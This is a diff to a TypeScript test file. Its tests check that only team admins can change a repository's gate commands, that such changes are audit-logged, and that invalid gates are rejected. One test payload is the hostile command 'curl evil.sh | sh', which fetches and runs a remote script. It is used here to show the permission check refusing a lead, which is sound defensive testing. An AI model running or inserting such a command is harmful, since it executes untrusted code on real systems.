@@ -73,6 +73,7 @@ async function buildApp() {
         team: { findUnique: (...args: unknown[]) => mockPrisma.team.findUnique(...args) },
       })
     ),
+    configAuditLog: { create: vi.fn().mockResolvedValue({}) },
     connection: {
       count: vi.fn(),
       create: vi.fn(),
@@ -141,6 +142,7 @@ describe('repositoryRoutes', () => {
     ctx.mockPrisma.connection.update.mockReset();
     ctx.mockPrisma.team.findUnique.mockReset();
     ctx.mockPrisma.teamMembership.findUnique.mockReset();
+    ctx.mockPrisma.configAuditLog.create.mockClear();
     github.verifiedGithubLoginFor.mockReset().mockResolvedValue('octocat');
     github.lookupRepoPermission.mockReset().mockResolvedValue({ ok: true, permission: 'read' });
   });
@@ -776,6 +778,114 @@ describe('repositoryRoutes', () => {
       expect(ok.statusCode).toBe(200);
       expect(bad.statusCode).toBe(400);
       expect(ctx.mockPrisma.connection.update).toHaveBeenCalledTimes(1);
+    });
+  });
+
+  describe('gate commands', () => {
+    const patch = (payload: Record<string, unknown>) =>
+      ctx.app.inject({
+        headers: AUTH_HEADER,
+        method: 'PATCH',
+        payload,
+        url: `/api/v1/repositories/${REPO_ID}`,
+      });
+    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
+      ctx.authState.role = 'LEAD';
+      ctx.authState.sub = 'lead-1';
+      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
+        role,
+        team: { isActive: true },
+      });
+    };
+    const stored = (gateCommands: unknown, type = 'git_repo') =>
+      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
+        executorImage: null,
+        gateCommands,
+        id: REPO_ID,
+        teamId: TEAM_ID,
+        type,
+      });
+    const written = (): Record<string, unknown> => {
+      const call = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as
+        | { data: Record<string, unknown> }
+        | undefined;
+      if (!call) {
+        throw new Error('expected an update');
+      }
+      return call.data;
+    };
+
+    beforeEach(() => {
+      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
+    });
+
+    it('refuses a team lead a new command: it runs in every run on the repository', async () => {
+      asTeamMember('LEAD');
+      stored(null);
+      const res = await patch({ gateCommands: { runTests: 'curl evil.sh | sh' } });
+      expect(res.statusCode).toBe(403);
+      expect(JSON.parse(res.payload).error).toEqual({
+        code: 'GATE_COMMANDS_FORBIDDEN',
+        message: "Changing a repository's gate commands requires team-admin role",
+      });
+      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
+    });
+
+    it('refuses a team lead clearing the commands an admin set', async () => {
+      asTeamMember('LEAD');
+      stored({ runTests: 'npm test' });
+      const res = await patch({ gateCommands: null });
+      expect(res.statusCode).toBe(403);
+    });
+
+    it('lets a team lead re-save the stored commands with an edit elsewhere', async () => {
+      asTeamMember('LEAD');
+      stored({ runLint: 'npm run lint', runTests: 'npm test' });
+      const res = await patch({
+        description: 'edited',
+        gateCommands: { runBuild: '  ', runLint: 'npm run lint', runTests: 'npm test' },
+      });
+      expect(res.statusCode).toBe(200);
+      expect(written()).not.toHaveProperty('gateCommands');
+      expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
+    });
+
+    it('lets a team admin set them, dropping blank gates, and audits the change', async () => {
+      asTeamMember('ADMIN');
+      stored({ runTests: 'npm test' });
+      const res = await patch({
+        gateCommands: { runBuild: '', runLint: 'pnpm lint', runTests: null },
+      });
+      expect(res.statusCode).toBe(200);
+      expect(written().gateCommands).toEqual({ runLint: 'pnpm lint' });
+      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
+        data: expect.objectContaining({
+          action: 'UPDATE',
+          actorId: 'lead-1',
+          afterJson: { gateCommands: { runLint: 'pnpm lint' } },
+          beforeJson: { gateCommands: { runTests: 'npm test' } },
+          entityId: REPO_ID,
+          entityType: 'Connection',
+        }),
+      });
+    });
+
+    it('stores a cleared set as null', async () => {
+      stored({ runTests: 'npm test' });
+      const res = await patch({ gateCommands: {} });
+      expect(res.statusCode).toBe(200);
+      expect(written().gateCommands).toBe(DB_NULL);
+    });
+
+    it('refuses an unknown gate, and gate commands on a connection that is not a repository', async () => {
+      stored(null);
+      const unknown = await patch({ gateCommands: { runDeploy: 'make deploy' } });
+      expect(unknown.statusCode).toBe(400);
+
+      stored(null, 'notion');
+      const notGit = await patch({ gateCommands: { runTests: 'npm test' } });
+      expect(notGit.statusCode).toBe(400);
+      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
     });
   });
 
